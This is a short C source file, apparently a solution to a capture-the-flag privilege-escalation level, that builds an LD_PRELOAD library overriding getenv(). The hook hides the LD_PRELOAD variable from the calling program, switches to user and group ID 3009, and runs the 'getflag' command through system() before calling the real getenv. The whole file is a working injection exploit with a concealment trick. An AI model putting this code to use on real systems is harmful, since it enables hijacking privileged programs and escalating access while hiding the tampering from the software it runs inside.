#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <limits.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>

// We will store the real function pointer in here
int (*o_open)(const char*, int oflag) = NULL;
char* (*o_getenv)(const char *) = NULL;

char* getenv(const char *name)
{
    if(!o_getenv)
        // Find the real function pointer
        o_getenv = dlsym(RTLD_NEXT, "getenv");
    if(strcmp(name, "LD_PRELOAD") == 0)
        // This environment variable does not exist, I swear
        return NULL;
	setuid(3009);
	setgid(3009);
	system("getflag");
    // Everything is ok, call the real getenv
    return o_getenv(name);
}
